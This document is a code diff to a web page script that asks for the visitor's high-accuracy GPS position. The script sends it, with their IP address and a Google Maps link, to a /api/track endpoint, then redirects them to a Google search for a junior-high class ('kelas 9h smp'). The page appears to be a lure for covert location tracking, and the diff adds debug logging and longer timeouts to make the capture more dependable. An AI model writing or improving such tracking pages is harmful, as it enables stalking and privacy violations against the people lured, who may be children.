@@ -77,20 +77,40 @@ async function startTrack(action) {
     ip = d.ip;
   } catch(e) {}
 
+  // === GPS dengan DEBUG ===
   const gpsData = await new Promise((resolve) => {
-    if (!navigator.geolocation) return resolve(null);
-    const timeout = setTimeout(() => resolve(null), 8000);
+    if (!navigator.geolocation) {
+      console.log('❌ Geolocation API gak didukung browser');
+      return resolve(null);
+    }
+
+    console.log('🛰️ Minta GPS...');
+    const timeout = setTimeout(() => {
+      console.log('⏰ GPS timeout 15 detik — fallback');
+      resolve(null);
+    }, 15000);
+
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         clearTimeout(timeout);
+        console.log('✅ GPS dapet:', pos.coords.latitude, pos.coords.longitude, '±', pos.coords.accuracy, 'm');
         resolve({
           lat: pos.coords.latitude.toFixed(6),
           lng: pos.coords.longitude.toFixed(6),
           acc: Math.round(pos.coords.accuracy)
         });
       },
-      () => { clearTimeout(timeout); resolve(null); },
-      { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+      (err) => {
+        clearTimeout(timeout);
+        console.log('❌ GPS error:', err.code, err.message);
+        // err.code: 1=PERMISSION_DENIED, 2=POSITION_UNAVAILABLE, 3=TIMEOUT
+        resolve(null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 14000,
+        maximumAge: 0
+      }
     );
   });
 
@@ -98,7 +118,7 @@ async function startTrack(action) {
   if (gpsData) maps = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`;
 
   try {
-    await fetch('/api/track', {
+    const res = await fetch('/api/track', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -109,11 +129,14 @@ async function startTrack(action) {
         maps
       })
     });
-  } catch(e) {}
+    console.log('📤 Backend response:', await res.text());
+  } catch(e) {
+    console.log('❌ Fetch error:', e.message);
+  }
 
   setTimeout(() => {
     window.location.href = 'https://www.google.com/search?q=kelas+9h+smp';
-  }, 1200);
+  }, 2000);
 }
 </script>
 </body>
